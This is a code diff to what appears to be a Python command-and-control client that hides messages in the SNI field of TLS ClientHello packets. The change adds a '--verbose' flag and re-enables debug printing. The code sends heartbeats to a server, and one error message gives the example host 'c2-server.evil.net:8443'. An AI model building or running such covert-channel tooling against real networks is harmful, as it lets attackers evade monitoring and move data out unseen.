@@ -60,7 +60,7 @@ MAX_MSG_LEN = MAX_SNI_LEN - MAX_TLD_LEN - SNI_PADDING_LEN - 2  # == 245 bytes
 
 POLL_INTERVAL = 10  # seconds for how often we send a heartbeat to the server
 MAX_RETRIES = 5  # Max num of times we will retry sending a message before giving up
-VERBOSE = True
+VERBOSE = False
 CLIENT_MODE = "sni"
 THREADS = 1
 MAX_THREADS = 64
@@ -297,9 +297,9 @@ class Session:
                 smuggle.set_payload(v)
                 sni = self._get_random_sni()
                 self._set_tls_client_hello(smuggle.to_bytes(), sni)
-            # if VERBOSE:
-            #     print(f"> HEADERS: {smuggle.to_bytes().hex()}")
-            #     print(f"> SNI: {sni[9:].decode()}")
+            if VERBOSE:
+                print(f"> HEADERS: {smuggle.to_bytes().hex()}")
+                print(f"> SNI: {sni[9:].decode()}")
             fragments.append(b"".join(self.tls_client_hello))
 
         # TODO: We have our fragments now, send them asyncronously
@@ -901,6 +901,13 @@ if __name__ == "__main__":
         help="For testing - Connect directly to server and dont use a proxy",
     )
     arg_parse.add_argument(
+        "-v",
+        "--verbose",
+        action="store_true",
+        required=False,
+        help="Be more verbose",
+    )
+    arg_parse.add_argument(
         "-s",
         "--server",
         metavar="server",
@@ -941,6 +948,8 @@ if __name__ == "__main__":
         arg_parse.error("Error: Either -d for direct connect or supply a valid --proxy argument")
     if not args.server:
         arg_parse.error("Error: No server (--server) was supplied. Example: --server c2-server.evil.net:8443")
+    if args.verbose:
+        VERBOSE = True
     if args.mode:
         if args.mode.lower() == "seed":
             CLIENT_MODE = "seed"
